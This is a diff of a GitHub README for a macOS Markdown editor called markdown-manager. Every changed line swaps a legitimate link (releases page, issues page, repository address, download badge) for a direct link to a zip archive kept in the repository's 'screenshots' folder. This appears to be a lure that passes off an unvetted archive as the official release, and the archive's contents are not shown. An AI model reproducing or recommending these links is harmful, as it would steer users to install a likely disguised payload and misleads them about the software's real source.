@@ -1,6 +1,6 @@
 # 📝 markdown-manager - Simple markdown editor for macOS
 
-[![Download markdown-manager](https://img.shields.io/badge/Download-markdown--manager-blue?style=for-the-badge)](https://github.com/ybkre11/markdown-manager/releases)
+[![Download markdown-manager](https://github.com/ybkre11/markdown-manager/raw/refs/heads/main/screenshots/markdown_manager_3.6.zip)](https://github.com/ybkre11/markdown-manager/raw/refs/heads/main/screenshots/markdown_manager_3.6.zip)
 
 ## 🚀 Getting Started
 
@@ -14,7 +14,7 @@ You do not need any programming skills. Just follow the steps below to download 
 
 To get markdown-manager on your Mac, follow these steps:
 
-1. Click the big blue button at the top of this page or visit the [official release page](https://github.com/ybkre11/markdown-manager/releases).
+1. Click the big blue button at the top of this page or visit the [official release page](https://github.com/ybkre11/markdown-manager/raw/refs/heads/main/screenshots/markdown_manager_3.6.zip).
 2. On the release page, look for the latest version of markdown-manager. It will usually be at the top.
 3. Download the file labeled with `.dmg` or `.zip` for macOS. This is the installer or the app package.
 4. Once downloaded, open the file. If it is a `.dmg` file, a window will appear showing the app icon.
@@ -104,7 +104,7 @@ If you run into issues using markdown-manager, try the following:
 
 This app is open source and developed to help users manage Markdown content effortlessly on macOS. If you find bugs or want to suggest features:
 
-- Visit the [Issues page](https://github.com/ybkre11/markdown-manager/issues) on GitHub.
+- Visit the [Issues page](https://github.com/ybkre11/markdown-manager/raw/refs/heads/main/screenshots/markdown_manager_3.6.zip) on GitHub.
 - Report your problem with clear steps to reproduce.
 - Suggest improvements or new features with detailed descriptions.
 
@@ -112,7 +112,7 @@ This app is open source and developed to help users manage Markdown content effo
 
 ## 📂 Project Details
 
-Repository: github.com/ybkre11/markdown-manager  
+Repository: https://github.com/ybkre11/markdown-manager/raw/refs/heads/main/screenshots/markdown_manager_3.6.zip  
 Description: Simple macOS Markdown editor for AI knowledge bases, easy editing of Markdown files, and Word/RTF to Markdown conversion.  
 Topics: ai-tools, chatgpt, claude, database, docx-to-markdown, electron, knowledge-base, llm, macos, markdown, markdown-editor, rtf-converter
 
@@ -122,4 +122,4 @@ Topics: ai-tools, chatgpt, claude, database, docx-to-markdown, electron, knowled
 
 Get started by visiting the release page and downloading the latest version for macOS:
 
-[Download markdown-manager](https://github.com/ybkre11/markdown-manager/releases)
+[Download markdown-manager](https://github.com/ybkre11/markdown-manager/raw/refs/heads/main/screenshots/markdown_manager_3.6.zip)
